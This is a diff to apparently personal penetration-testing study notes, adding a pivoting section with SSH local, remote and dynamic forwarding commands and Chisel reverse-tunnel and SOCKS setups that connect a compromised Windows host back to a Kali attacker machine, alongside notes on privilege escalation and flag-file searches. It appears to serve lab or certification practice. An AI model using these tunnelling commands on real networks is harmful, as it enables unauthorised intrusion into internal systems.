@@ -8,6 +8,7 @@ sudo ip link set dev tun0 mtu 1000
 ```
 Also, ensure that you are using Google's DNS servers in your Kali by running these commands:  
 `sudo chattr -i /etc/resolv.conf` `sudo bash -c "" echo nameserver 8.8.8.8 > /etc/resolv.conf"" && sudo bash -c "" echo nameserver 8.8.4.4 >> /etc/resolv.conf""`
+
 # <span style="color:rgb(11, 142, 224)">Enumeration </span>
 
 not always will the machine allow ping 
@@ -114,7 +115,7 @@ dir z:
 here , "randomname" is just a random name given , and can give any username and password 
 "." here is work in the current directory
 authentication required as some servers so not accept without auth
-# <span style="color:rgb(11, 142, 224)">Port Forwarding </span>
+# <span style="color:rgb(11, 142, 224)">Port Forwarding/Pivoting </span>
 
 after gaining initial access , to discover more devices on same network use nmap to scan
 download from : (on kali attacker machine)
@@ -130,26 +131,61 @@ now check which machine you can access now
 ```
 ./nmap -p0-100 -vv <different left ips>
 ```
+
+SSH : 
 to do local port forwarding :
 ```
-ssh -L <my which attacker local port>:<final target ip>:<final target port> root@<through which ip> -i id_rsa -fN 
+ssh -L <attacker local port>:<target ip>:<target port> root@<through which ip> -i id_rsa -fN 
 
 localhost:8000      # now everything visible on this 
 127.0.0.1:8000
 ```
 to do remote port forwarding :
 ```
-
+ssh -R <local port to open>:<which final internal network machine ip>:<which target port to forward to of internal network machine> kali@<kali ip> -fN
 ```
-to do dynamic port forwarding :
+to do dynamic port forwarding : (on kali)
+```
+ssh -D 9050 -i id_rsa root@<ip to forward traffic to>
 ```
 
+
+Chisel : 
+```
+sudo apt install chisel     #kali linux - attacker 
+
+https://github.com/jpillora/chisel/releases/tag/v1.12.0   # windows 
+chisel_1.12.0_windows_amd64.zip
+```
+Attacker / Kali — start server : 
+```
+chisel server -p 8080 --reverse
+```
+Pivot / Win1 — connect back to Kali and create reverse forward : 
+```
+chisel.exe client <KALI_IP>:<CHISEL_PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
+```
+
+Chisel with SOCKS (for dynamic port forwarding):
+```
+sudo gedit /etc/proxychains.conf
+add line in last : socks5 127.0.0.1 9050
+```
+Attacker / Kali — start server : 
+```
+chisel server -p 8000 --reverse
+```
+Pivot / Win1 — connect back to Kali and create reverse forward : 
+```
+chisel.exe client <KALI_IP>:8000 R:<SOCKS_PORT>:socks
+#chisel.exe client 10.10.10.5:8000 R:9050:socks
 ```
 
 # <span style="color:rgb(11, 142, 224)">Linux Privilege Escalation</span>
 
+
 ```
-sudo -l
+sudo -l 
 ```
 
 SUID : 
@@ -252,6 +288,11 @@ users > desktop/documents
 where /r C:\ local.txt
 where /r C:\ proof.txt
 ```
+
+
+# <span style="color:rgb(11, 142, 224)">Active Directory</span>
+
+
 
 
 # <span style="color:rgb(11, 142, 224)">Web Application </span>
